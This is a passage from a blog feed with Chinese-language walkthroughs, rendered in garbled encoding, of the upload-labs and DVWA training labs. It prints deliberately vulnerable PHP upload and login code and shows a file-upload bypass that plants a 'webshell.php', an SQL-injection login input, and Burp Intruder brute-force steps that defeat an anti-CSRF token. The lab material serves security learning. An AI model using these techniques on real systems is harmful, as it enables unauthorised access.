class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>æ–°å‡½æ•°ï¼š</strong></li></ul><p>â€”ï¼‰<strong>empty()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºã€‚</p><p>â€”ï¼‰<strong>explode()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚</p><p>è¯­æ³•ï¼šexplode(separator,string,limit)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>separator</em></td><td align="left">å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>limit</em></td><td align="left">å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼šå¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š <em>limit</em> ä¸ªå…ƒç´ çš„æ•°ç»„ï¼›å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -<em>limit</em> ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ï¼›0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„</td></tr></tbody></table><p>â€”ï¼‰<strong>is_array() å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</p><p>â€”ï¼‰<strong>end()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šå°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚</p><p>è¯­æ³•ï¼šend(array)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚</td></tr></tbody></table><p>ç›¸å…³çš„å‡½æ•°ï¼š</p><ol><li>current() - è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼</li><li>next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>reset()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ol><ul><li>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å…ˆå¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œäº†MIMEæ£€æŸ¥ï¼Œç„¶ååˆ¤æ–­save_nameå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±æŠŠæ–‡ä»¶æœ¬æ¥åç§°èµ‹å€¼ç»™$file,å¦åˆ™å°±æ˜¯å°†save_nameå‚æ•°çš„å€¼èµ‹ç»™$fileã€‚æ¥ç€åˆ¤æ–­$fileæ˜¯å¦æ˜¯æ•°ç»„ï¼Œå¦‚æœä¸æ˜¯æ•°ç»„åˆ™æ‹†é™¤æ•°ç»„ï¼Œå°†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯åç¼€ï¼‰å’Œå…è®¸ä¸Šä¼ æ–‡ä»¶åç¼€ç›¸æ¯”ï¼Œè‹¥ç¬¦åˆåˆ™å–$fileæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ åŠ <code>.</code>å’Œ$fileçš„ç¬¬äºŒä¸ªå…ƒç´ ä½œä¸ºæ–°çš„æ–‡ä»¶åï¼Œå¹¶å°†å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°æŒ‡å®šè·¯å¾„ã€‚</li><li>è¡¥å……çŸ¥è¯†ï¼šå¯¹äºåƒ<code>.php/.</code>è¿™æ ·çš„æ–‡ä»¶è·¯å¾„ï¼Œmove_uploaded_file()å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code>ã€‚å¦‚æ­¤ä¸€æ¥æˆ‘ä»¬ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶è¿˜æ˜¯è¢«é‡å‘½åä¸ºäº†phpåç¼€ã€‚</li><li>é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æƒ³æ³•æ˜¯ï¼šæå‰å°†save_nameè®¾ç½®ä¸ºæ•°ç»„ï¼Œå³ä»¤<code>save_name[0]=webshell.php/</code>ã€<code>save_name[2]=jpg</code>ï¼Œå…¶ä¸­save_name[1]çš„å€¼ä¸ºç©ºã€‚è¿™æ ·å°±å¯ä»¤<code>$file_name=webshell.php/.</code>ã€‚ä½†æ˜¯è¿™è¾¹æœ‰ä¸ªç–‘é—®ï¼Œsave_nameæ•°ç»„çš„å…ƒç´ ä¸ªæ•°ä¸æ˜¯ä¸‰ä¸ªå—ï¼Œ$file[count($file) - 1]=$file[2]å•Šã€‚ä½†æ˜¯å…¶å®æˆ‘ä»¬åªå¯¹æ•°ç»„èµ‹å€¼äº†ä¸¤ä¸ªå…ƒç´ ï¼Œå› æ­¤countçš„å€¼ä¸º2ï¼Œè¿™å°±ç›¸å½“äºä½ æœ‰3ä¸ªå£è¢‹ï¼Œä½†æ˜¯åªæœ‰ä¸¤ä¸ªå£è¢‹æœ‰é’±ã€‚</li></ul><p>ä¸‹é¢æ˜¯å®è·µï¼š<img src="/upload-labs-pass14-21/5-1614255649559.png" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä»pass-14å¼€å§‹éƒ½æ˜¯å›¾ç‰‡é©¬æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;å›¾ç‰‡é©¬çš„åˆ¶ä½œ&lt;/str</summary>
      
    
    
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”Brute Force</title>
    <link href="http://example.com/2021/02/16/DVWA%E2%80%94Brute%20Force/"/>
    <id>http://example.com/2021/02/16/DVWA%E2%80%94Brute%20Force/</id>
    <published>2021-02-16T13:36:40.000Z</published>
    <updated>2021-03-03T14:43:56.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¯¥ç³»åˆ—çš„å®éªŒä¸»è¦å›´ç»•åˆ©ç”¨burpsuiteçš„æš´åŠ›ç ´è§£ã€‚æš´åŠ›ç ´è§£ï¼Œæ˜¯æŒ‡é»‘å®¢åˆ©ç”¨å¯†ç å­—å…¸ï¼Œä½¿ç”¨ç©·ä¸¾æ³•çŒœè§£å‡ºç”¨æˆ·å£ä»¤ï¼Œæ˜¯ç°åœ¨æœ€ä¸ºå¹¿æ³›ä½¿ç”¨çš„æ”»å‡»æ‰‹æ³•ä¹‹ä¸€ã€‚</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];  </span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];   </span><br><span class="line">$pass = md5( $pass );   </span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>; </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹è¾“å…¥çš„è´¦å·å¯†ç æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><p><strong>1)SQLæ³¨å…¥</strong></p><p>è¾“å…¥usernameï¼šadminâ€™#ï¼Œpasswordï¼šéšä¾¿è¾“ã€‚</p><p><strong>2)æš´åŠ›ç ´è§£</strong></p><p>è¾“å…¥ç›®æ ‡è´¦å·å’Œéšæ„å¯†ç ï¼ŒæŠ“åŒ…ï¼š</p><p>![1](DVWAâ€”Brute Force/1.png)</p><p>send to intruderï¼Œæ¸…é™¤æ ‡è®°ï¼Œå¯¹å¸Œæœ›çˆ†ç ´çš„å€¼æ ‡è®°ï¼š![2](DVWAâ€”Brute Force/2.png)</p><p>é€‰æ‹©payloadï¼Œè½½å…¥å­—å…¸ï¼š![3](DVWAâ€”Brute Force/3.png)</p><p>start attackï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“payloadçš„å€¼ä¸ºpasswordæ—¶å›æ–‡çš„é•¿åº¦ä¸ä¼—ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¾—çŸ¥ç”¨æˆ·adminçš„å¯†ç ä¸ºpassword![4](DVWAâ€”Brute Force/4.png)</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Login&#x27;</span>]))&#123; </span><br><span class="line">$user=$_GET[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">$user=mysql_real_escape_string($user); </span><br><span class="line">$pass=$_GET[<span class="string">&#x27;password&#x27;</span>]; </span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line">$query=<span class="string">&quot;SELECT*FROM`users`WHEREuser=&#x27;<span class="subst">$user</span>&#x27;ANDpassword=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹è´¦å·å¯†ç éƒ½åšäº†è¿‡æ»¤å¤„ç†ï¼Œå¯¹ä¸€äº›æ•æ„Ÿå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚å®æˆ˜ä¸­å¦‚æœç›®æ ‡æœåŠ¡å™¨çš„MySQLæ•°æ®åº“é‡‡ç”¨gbkç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡Œç”¨å®½å­—èŠ‚ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘è¿™è¾¹æ•°æ®åº“æ²¡æœ‰è¿™ä¹ˆè®¾ç½®ï¼Œå› æ­¤æˆ‘ä»¬ç”¨SQLæ³¨å…¥æ˜¯ä¸å¤§å¯èƒ½å®ç°äº†ï¼Œæˆ‘ä»¬æ¥ç€çœ‹æºç å‘ç°ç»•è¿‡æˆ‘ä»¬è¾“å…¥äº†é”™è¯¯çš„è´¦å·å¯†ç ï¼ŒæœåŠ¡å™¨ä¹Ÿåªä¼šå»¶è¿Ÿç½‘é¡µä¸¤ç§’è€Œå·²ï¼Œä¸ç®—æœ‰æ•ˆçš„é˜²çˆ†ç ´æœºåˆ¶ã€‚ä¸€æ¬¡æœ¬å…³ä»ä½¿ç”¨æš´åŠ›ç ´è§£ï¼Œå…·ä½“åŒä¸Šä¸€å…³ã€‚</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>è¡¥å……â€”â€”</strong> <strong>$GLOBALS ï¼š</strong>å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚$GLOBALS è¿™ç§å…¨å±€å˜é‡ç”¨äºåœ¨ PHP è„šæœ¬ä¸­çš„ä»»æ„ä½ç½®è®¿é—®å…¨å±€å˜é‡ï¼ˆä»å‡½æ•°æˆ–æ–¹æ³•ä¸­å‡å¯ï¼‰ã€‚PHP åœ¨åä¸º $GLOBALS[index] çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p><p>é€šè¿‡ä»£ç å®¡è®¡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ä½¿ç”¨äº†Anti-CSRF tokenæ¥æŠµå¾¡CSRFçš„æ”»å‡»ï¼Œä½¿ç”¨äº†stripslasheså‡½æ•°å’Œmysqli_real_esacpe_stringæ¥æŠµå¾¡SQLæ³¨å…¥å’ŒXSSçš„æ”»å‡»ã€‚è€Œä¸”ç”±äºä½¿ç”¨äº†Anti-CSRF tokenï¼Œæ¯æ¬¡æœåŠ¡å™¨è¿”å›åˆ°ç™»é™†é¡µé¢ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„user_tokençš„å€¼ï¼Œç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶éƒ½è¦å°†user_tokenä¸€èµ·æäº¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œä¼šä¼˜å…ˆåštokençš„æ£€æŸ¥ï¼Œå†è¿›è¡ŒsqlæŸ¥è¯¢ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸èƒ½å†åƒlowå’Œmediumçº§åˆ«ä¸€æ ·ï¼Œåˆ©ç”¨burpsuiteè¿›è¡Œæ— è„‘å¼çš„çˆ†ç ´äº†ã€‚</p><p>è¿™å…³å¯ä»¥æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨paythonè„šæœ¬ä»htmlé¡µé¢ä¸­æŠ“å–user_tokençš„å€¼ï¼ˆä½†æ˜¯æˆ‘è¿˜æ²¡å­¦paythonï¼Œç­‰ä»¥åè¡¥å§ï¼‰ï¼Œå¦ä¸€ç§æ˜¯ä»ä½¿ç”¨burpï¼Œå› ä¸ºå³ä½¿æˆ‘ä»¬è¾“é”™å¯†ç ï¼Œ sleep( rand( 0, 3 ) )ä¹Ÿåªä¼šç½‘é¡µå»¶è¿Ÿ0åˆ°3ç§’ï¼Œä¸è¶³ä»¥é˜²å¾¡æš´åŠ›ç ´è§£ã€‚ä½†æˆ‘ä»¬éœ€è¦æ›´æ¢æ”»å‡»æ¨¡å¼ç­‰ï¼Œæˆ‘ä»¬ä¸‹é¢å±•å¼€æ¥è®²ï¼š</p><ul><li><p>å°†æ”»å‡»æ¨¡å¼æ”¹ä¸º<strong>Pitchfork</strong>{è‰å‰æ¨¡å¼ â€”â€”å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿— ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œéå†æ‰€æœ‰çš„Payloadã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œ ç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºaå’Œbï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·ä¸¤æ¬¡æ”» å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’Œaï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’Œbã€‚}å¹¶å°†passwordå’Œuser_tokenè®¾ä¸ºå˜é‡ã€‚![5](DVWAâ€”Brute Force/5-1614780376113.png)</p></li><li><p>ç¬¬ä¸€ä¸ªå˜é‡passwordæˆ‘ä»¬å°±ç…§å¸¸è½½å…¥å­—å…¸å°±å¯ä»¥äº†ã€‚ç¬¬äºŒä¸ªå˜é‡user_tokençš„payloadè®¾ç½®æˆ‘ä»¬é€‰æ‹©Recursive grep é€‰é¡¹ï¼ˆRecursive grepâ€”â€”æ­¤Payloadç±»å‹ä¸»è¦ä½¿ç”¨äºä»æœåŠ¡å™¨ç«¯æå–æœ‰æ•ˆæ•°æ®çš„åœºæ™¯ï¼Œéœ€è¦å…ˆä»æœåŠ¡å™¨çš„å“åº”ä¸­æå–æ•°æ®ä½œä¸ºPayloadï¼Œç„¶åæ›¿æ¢Payloadçš„ä½ç½®ï¼Œè¿›è¡Œ æ”»å‡»ã€‚å®ƒçš„æ•°æ®æ¥æºäº†åŸå§‹çš„å“åº”æ¶ˆæ¯ï¼ŒåŸºäºåŸå§‹å“åº”ï¼Œåœ¨Payloadçš„å¯é€‰é¡¹è®¾ç½® ï¼ˆOptionsï¼‰çš„ Grep-Extractä¸­é…ç½®Grepè§„åˆ™ï¼Œç„¶åæ ¹æ®grepå»æå–æ•°æ®æ‰èƒ½å‘ç”Ÿæ”»å‡»ï¼‰ï¼Œç„¶åæˆ‘ä»¬åœ¨option é€‰é¡¹ä¸­æ‰¾åˆ° Grep-Extract ,ç‚¹å‡» Add, ç„¶åç‚¹å‡» Refetch repose å³å¯çœ‹åˆ°æŠ“å–åˆ°çš„æºä»£ç äº†ï¼Œæˆ‘ä»¬æ‰¾åˆ° user_token çš„å€¼valueï¼Œé€‰ä¸­å®ƒï¼Œä¹‹åç‚¹å‡»okã€‚![6](DVWAâ€”Brute Force/6.png)</p><p>![7](DVWAâ€”Brute Force/7-1614781678680.png)</p></li></ul><p>å…¶å®ä¸Šè¿°çš„æ“ä½œåªæ˜¯ä¸ºäº†è¾¾åˆ°ä¸€ä¸ªç›®çš„ï¼šç”±äºæ¯æ¬¡è®¿é—®æœåŠ¡å™¨åï¼Œuser_tokenéƒ½ä¼šåˆ·æ–°ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è®©å˜é‡user_tokenâ€ä¸æ—¶ä¿±è¿›â€œã€‚</p><p>æ­¤å¤–æˆ‘ä»¬è¦å°†çº¿ç¨‹è®¾ä¸º1ï¼Œå› ä¸ºrecursive grep payloads cannot be used with multiple request threadsã€‚åŒæ—¶ åœ¨ Options ä¸­æ‰¾åˆ° Redirections è®¾ç½®ä¸º Alwaysã€‚åšå®Œè¿™äº›å‡†å¤‡æ“ä½œï¼Œå°±å¯ä»¥ç‚¹å‡»start attackå¼€å§‹çˆ†ç ´ï¼Œ</p><p>![8](DVWAâ€”Brute Force/8.png)</p><p>æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ä¸ªå€¼çš„å›æ–‡é•¿åº¦å¼‚å¸¸ï¼Œæˆ‘ä»¬ç‚¹å‡»æ•°æ®å…·ä½“æŸ¥çœ‹å›æ–‡ï¼Œå‘ç°å¯†ç ä¸ºpaawordæ—¶ç™»å…¥æˆåŠŸï¼š</p><p>![9](DVWAâ€”Brute Force/9.png)</p>]]></content>
    
    
      
      
